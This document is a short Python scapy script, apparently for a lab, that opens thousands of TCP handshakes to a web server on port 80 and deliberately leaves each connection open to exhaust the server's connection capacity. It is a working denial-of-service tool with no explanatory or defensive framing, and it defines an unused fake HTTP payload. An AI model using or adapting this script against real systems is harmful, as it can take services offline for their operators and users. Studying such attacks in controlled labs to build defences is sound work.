#!/usr/bin/python3

import string
from scapy.all import *
import signal
import threading
import time
import logging
import sys

signal.signal(signal.SIGINT, lambda s, f: sys.exit(-1))	

target = "192.168.220.130"
host = "192.168.220.142" 
sport_start = random.randint(20000, 40000)
count = 25000
dport = 80

fake_payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target)

ip=IP(src=host, dst=target)

for sport in range(sport_start, sport_start + count - 1):
	# three way handshake
	syn = TCP(sport=sport, dport=dport, flags='S', seq=100)
	synack = sr1(ip/syn, verbose=0)
	ack = TCP(sport=sport, dport=dport, flags='A', seq=101, ack=synack.seq + 1)
	send(ip/ack, verbose=0)
	# now we leave the connection open
	# and open another
	print(".", end = "")
	if (sport - sport_start) % 80 == 0:
		print("\n", end = "")
	



